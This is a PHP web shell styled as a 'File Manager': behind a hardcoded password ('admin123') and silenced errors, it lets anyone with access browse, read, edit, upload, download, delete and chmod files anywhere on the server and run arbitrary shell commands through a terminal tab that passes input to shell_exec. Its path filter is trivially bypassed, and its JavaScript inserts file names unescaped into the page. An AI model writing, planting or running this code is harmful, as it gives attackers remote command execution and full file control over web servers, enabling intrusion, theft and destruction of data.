<?php
error_reporting(0);
@ini_set('display_errors', 0);

// Simple auth
session_start();
$pass = 'admin123'; // Bunu dəyiş

if(!isset($_SESSION['auth'])) {
    if(isset($_POST['pass']) && $_POST['pass'] == $pass) {
        $_SESSION['auth'] = true;
    } else {
        die('<form method=post>Password: <input type=password name=pass><input type=submit value=Login></form>');
    }
}

if(isset($_GET['logout'])) {
    session_destroy();
    header('Location: '.$_SERVER['PHP_SELF']);
    exit;
}

// Functions
function safe_path($p) {
    return str_replace(['../', '..\\'], '', $p);
}

function get_files($dir) {
    $dir = safe_path($dir);
    if(!is_dir($dir)) return [];
    $items = @scandir($dir);
    $result = [];
    foreach($items as $item) {
        if($item == '.' || $item == '..') continue;
        $path = $dir.'/'.$item;
        $result[] = [
            'name' => $item,
            'path' => $path,
            'type' => is_dir($path) ? 'dir' : 'file',
            'size' => is_file($path) ? @filesize($path) : 0,
            'perms' => @substr(sprintf('%o', @fileperms($path)), -4)
        ];
    }
    return $result;
}

// Actions
if(isset($_POST['act'])) {
    header('Content-Type: application/json');
    $act = $_POST['act'];
    
    if($act == 'list') {
        echo json_encode(get_files($_POST['dir']));
        exit;
    }
    
    if($act == 'read') {
        $content = @file_get_contents(safe_path($_POST['file']));
        echo json_encode(['ok' => $content !== false, 'data' => $content]);
        exit;
    }
    
    if($act == 'write') {
        $ok = @file_put_contents(safe_path($_POST['file']), $_POST['content']);
        echo json_encode(['ok' => $ok !== false]);
        exit;
    }
    
    if($act == 'delete') {
        $ok = @unlink(safe_path($_POST['file']));
        if(!$ok) $ok = @rmdir(safe_path($_POST['file']));
        echo json_encode(['ok' => $ok]);
        exit;
    }
    
    if($act == 'rename') {
        $ok = @rename(safe_path($_POST['old']), safe_path($_POST['new']));
        echo json_encode(['ok' => $ok]);
        exit;
    }
    
    if($act == 'chmod') {
        $ok = @chmod(safe_path($_POST['file']), octdec($_POST['perm']));
        echo json_encode(['ok' => $ok]);
        exit;
    }
    
    if($act == 'newfile') {
        $ok = @touch(safe_path($_POST['dir']).'/'.$_POST['name']);
        echo json_encode(['ok' => $ok]);
        exit;
    }
    
    if($act == 'newdir') {
        $ok = @mkdir(safe_path($_POST['dir']).'/'.$_POST['name']);
        echo json_encode(['ok' => $ok]);
        exit;
    }
    
    if($act == 'upload') {
        $ok = @move_uploaded_file($_FILES['file']['tmp_name'], safe_path($_POST['dir']).'/'.$_FILES['file']['name']);
        echo json_encode(['ok' => $ok]);
        exit;
    }
    
    if($act == 'cmd') {
        $out = '';
        if(function_exists('shell_exec')) {
            $out = @shell_exec($_POST['cmd'].' 2>&1');
        } elseif(function_exists('exec')) {
            @exec($_POST['cmd'].' 2>&1', $out);
            $out = implode("\n", $out);
        }
        echo json_encode(['out' => $out]);
        exit;
    }
    
    if($act == 'download') {
        $file = safe_path($_POST['file']);
        if(is_file($file)) {
            header('Content-Type: application/octet-stream');
            header('Content-Disposition: attachment; filename="'.basename($file).'"');
            readfile($file);
        }
        exit;
    }
}

$cwd = isset($_GET['dir']) ? safe_path($_GET['dir']) : getcwd();
?>
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>File Manager</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#0a0a0a;color:#0f0;font:14px monospace;padding:10px}
.top{background:#1a1a1a;padding:15px;margin-bottom:10px;border-radius:5px;display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap}
.top a{color:#0f0;text-decoration:none;padding:5px 10px;background:#222;margin:2px;border-radius:3px;display:inline-block}
.top a:hover{background:#333}
.tabs{display:flex;gap:5px;margin-bottom:10px;flex-wrap:wrap}
.tab{background:#1a1a1a;padding:10px 15px;cursor:pointer;border-radius:5px}
.tab:hover,.tab.active{background:#333}
.content{display:none;background:#1a1a1a;padding:15px;border-radius:5px}
.content.active{display:block}
.list{list-style:none}
.item{padding:10px;margin:5px 0;background:#222;border-radius:3px;display:flex;align-items:center;justify-content:space-between;cursor:pointer}
.item:hover{background:#333}
.item .name{flex:1}
.item .acts{display:flex;gap:5px}
.btn{background:#0a5;color:#fff;border:none;padding:6px 12px;border-radius:3px;cursor:pointer;font:12px monospace}
.btn:hover{background:#0c7}
.btn.del{background:#a00}
.btn.del:hover{background:#c00}
input,textarea{background:#222;border:1px solid #444;color:#0f0;padding:8px;border-radius:3px;width:100%;margin:5px 0;font:13px monospace}
textarea{min-height:300px;font-family:monospace}
.form{margin:10px 0}
.terminal{background:#000;color:#0f0;padding:10px;border-radius:3px;min-height:400px;overflow-y:auto;font:12px monospace;white-space:pre-wrap}
.cmd-input{display:flex;margin-top:10px}
.cmd-input input{flex:1;margin:0}
@media(max-width:768px){.item{flex-direction:column;align-items:flex-start}.acts{margin-top:10px;width:100%}}
</style>
</head>
<body>

<div class="top">
    <div>
        <strong>Path:</strong> 
        <?php
        $parts = explode('/', $cwd);
        $path = '';
        foreach($parts as $p) {
            if(!$p) continue;
            $path .= '/'.$p;
            echo "<a href='?dir=$path'>$p</a>";
        }
        ?>
    </div>
    <div>
        <a href="?logout=1">Logout</a>
    </div>
</div>

<div class="tabs">
    <div class="tab active" onclick="showTab('files')">Files</div>
    <div class="tab" onclick="showTab('editor')">Editor</div>
    <div class="tab" onclick="showTab('terminal')">Terminal</div>
    <div class="tab" onclick="showTab('upload')">Upload</div>
</div>

<div id="files" class="content active">
    <div class="form">
        <input type="text" id="newfile" placeholder="New file name">
        <button class="btn" onclick="newFile()">Create File</button>
        <input type="text" id="newdir" placeholder="New directory name">
        <button class="btn" onclick="newDir()">Create Dir</button>
    </div>
    <ul class="list" id="filelist"></ul>
</div>

<div id="editor" class="content">
    <div class="form">
        <input type="text" id="editpath" placeholder="File path">
        <button class="btn" onclick="loadFile()">Load</button>
        <button class="btn" onclick="saveFile()">Save</button>
    </div>
    <textarea id="editcontent"></textarea>
</div>

<div id="terminal" class="content">
    <div class="terminal" id="termout">$ Welcome</div>
    <div class="cmd-input">
        <span style="color:#0f0;padding:0 5px">$</span>
        <input type="text" id="cmdinput" onkeypress="if(event.key=='Enter')runCmd()">
        <button class="btn" onclick="runCmd()">Run</button>
    </div>
</div>

<div id="upload" class="content">
    <div class="form">
        <input type="file" id="upfile">
        <button class="btn" onclick="uploadFile()">Upload</button>
    </div>
</div>

<script>
let dir = '<?php echo addslashes($cwd); ?>';

function req(data, cb) {
    fetch('', {
        method: 'POST',
        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
        body: new URLSearchParams(data)
    }).then(r => r.json()).then(cb);
}

function showTab(id) {
    document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
    document.querySelectorAll('.content').forEach(c => c.classList.remove('active'));
    event.target.classList.add('active');
    document.getElementById(id).classList.add('active');
}

function loadList() {
    req({act:'list', dir:dir}, data => {
        let html = '';
        if(dir != '/') {
            let up = dir.split('/').slice(0,-1).join('/') || '/';
            html += `<li class="item" onclick="changeDir('${up}')"><span class="name">..</span></li>`;
        }
        data.forEach(f => {
            let acts = f.type == 'file' ? 
                `<button class="btn" onclick="editIt('${f.path}')">Edit</button>
                 <button class="btn" onclick="download('${f.path}')">Down</button>` : '';
            let click = f.type == 'dir' ? `changeDir('${f.path}')` : '';
            html += `<li class="item" onclick="${click}">
                <span class="name">${f.type=='dir'?'📁':'📄'} ${f.name} (${formatSize(f.size)})</span>
                <div class="acts">
                    ${acts}
                    <button class="btn" onclick="renameIt('${f.path}')">Ren</button>
                    <button class="btn" onclick="chmodIt('${f.path}')">Chmod</button>
                    <button class="btn del" onclick="deleteIt('${f.path}')">Del</button>
                </div>
            </li>`;
        });
        document.getElementById('filelist').innerHTML = html;
    });
}

function changeDir(d) {
    dir = d;
    location.href = '?dir=' + d;
}

function formatSize(b) {
    if(!b) return '0B';
    let k = 1024, s = ['B','KB','MB','GB'];
    let i = Math.floor(Math.log(b)/Math.log(k));
    return (b/Math.pow(k,i)).toFixed(1) + s[i];
}

function deleteIt(f) {
    if(!confirm('Delete?')) return;
    req({act:'delete', file:f}, d => {
        alert(d.ok ? 'Deleted' : 'Failed');
        loadList();
    });
}

function renameIt(f) {
    let n = prompt('New name:', f);
    if(!n) return;
    req({act:'rename', old:f, new:n}, d => {
        alert(d.ok ? 'Renamed' : 'Failed');
        loadList();
    });
}

function chmodIt(f) {
    let p = prompt('Perms (0644):', '0644');
    if(!p) return;
    req({act:'chmod', file:f, perm:p}, d => {
        alert(d.ok ? 'Changed' : 'Failed');
        loadList();
    });
}

function newFile() {
    let n = document.getElementById('newfile').value;
    if(!n) return alert('Enter name');
    req({act:'newfile', dir:dir, name:n}, d => {
        alert(d.ok ? 'Created' : 'Failed');
        loadList();
    });
}

function newDir() {
    let n = document.getElementById('newdir').value;
    if(!n) return alert('Enter name');
    req({act:'newdir', dir:dir, name:n}, d => {
        alert(d.ok ? 'Created' : 'Failed');
        loadList();
    });
}

function editIt(f) {
    document.getElementById('editpath').value = f;
    showTab('editor');
    loadFile();
}

function loadFile() {
    let f = document.getElementById('editpath').value;
    if(!f) return;
    req({act:'read', file:f}, d => {
        if(d.ok) document.getElementById('editcontent').value = d.data;
        else alert('Failed to load');
    });
}

function saveFile() {
    let f = document.getElementById('editpath').value;
    let c = document.getElementById('editcontent').value;
    if(!f) return alert('Enter path');
    req({act:'write', file:f, content:c}, d => {
        alert(d.ok ? 'Saved' : 'Failed');
    });
}

function runCmd() {
    let cmd = document.getElementById('cmdinput').value;
    if(!cmd) return;
    let out = document.getElementById('termout');
    out.innerHTML += '\n$ ' + cmd + '\n';
    req({act:'cmd', cmd:cmd}, d => {
        out.innerHTML += d.out + '\n';
        out.scrollTop = out.scrollHeight;
    });
    document.getElementById('cmdinput').value = '';
}

function uploadFile() {
    let f = document.getElementById('upfile').files[0];
    if(!f) return alert('Select file');
    let fd = new FormData();
    fd.append('act', 'upload');
    fd.append('dir', dir);
    fd.append('file', f);
    fetch('', {method:'POST', body:fd})
    .then(r => r.json())
    .then(d => {
        alert(d.ok ? 'Uploaded' : 'Failed');
        loadList();
    });
}

function download(f) {
    let form = document.createElement('form');
    form.method = 'POST';
    form.innerHTML = `<input name="act" value="download"><input name="file" value="${f}">`;
    document.body.appendChild(form);
    form.submit();
    document.body.removeChild(form);
}

loadList();
</script>
</body>
</html>
